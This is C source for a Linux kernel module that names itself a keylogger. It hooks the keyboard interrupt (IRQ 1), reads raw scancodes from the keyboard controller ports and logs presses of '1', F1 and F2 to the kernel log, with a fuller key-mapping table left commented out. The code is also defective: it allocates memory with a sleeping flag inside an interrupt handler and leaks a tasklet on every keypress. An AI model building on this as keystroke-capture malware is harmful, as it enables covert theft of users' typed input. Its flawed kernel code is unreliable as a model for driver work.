#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/workqueue.h>
#include <linux/interrupt.h>
#include <asm/io.h>

void* HANDLER_KEY;
struct tasklet_struct *kl_tasklet;

// static const char* keycode_to_key[20][2] = {
// 	{0x01, "esc"},{0x02, "1"},
// 	{0x03, "2"},{0x04, "3"},
// 	{0x05, "4"},{0x06, "5"},
// 	{0x06, "5"},{0x07, "6"},
// 	{0x08, "7"},{0x09, "8"},
// 	{0x0A, "9"},{0x0B, "0"},
// 	{0x0C, "-"},{0x0D, "="},
// 	{0x0E, "back_space"},{0x0F, "tab"},
// 	{0x10, "Q"},{0x11, "W"},
// 	{0x12, "E"},{0x13, "R"}
// };

static void kl_tasklet_function(unsigned long scancode)
{
	switch (scancode)
	{
  		case 0x02:  printk (KERN_INFO "! You pressed 1\n");
              		break;
  		case 0x3B:  printk (KERN_INFO "! You pressed F1 ...\n");
              		break;
  		case 0x3C:  printk (KERN_INFO "! You pressed F2 ...\n");
              		break;
  		default:
        			break;
	}
}

irqreturn_t kl_handler(int irq, void *dev_id)
{

  	static unsigned char scancode;
  	unsigned char status;

	status = inb(0x64);
  	scancode = inb(0x60);
	kl_tasklet = kmalloc(sizeof(struct tasklet_struct), GFP_KERNEL);
	tasklet_init(kl_tasklet, kl_tasklet_function, scancode);
	tasklet_schedule(kl_tasklet);

  	return IRQ_HANDLED;
}

static int __init keylogger_init(void)
{
    HANDLER_KEY = (void *)(kl_handler);
    return request_irq (1, (irq_handler_t) kl_handler,IRQF_SHARED,"keylogger", HANDLER_KEY);
}

static void __exit keylogger_exit(void)
{
	tasklet_kill(kl_tasklet);
    free_irq(1, HANDLER_KEY);
}

module_init(keylogger_init);
module_exit(keylogger_exit);

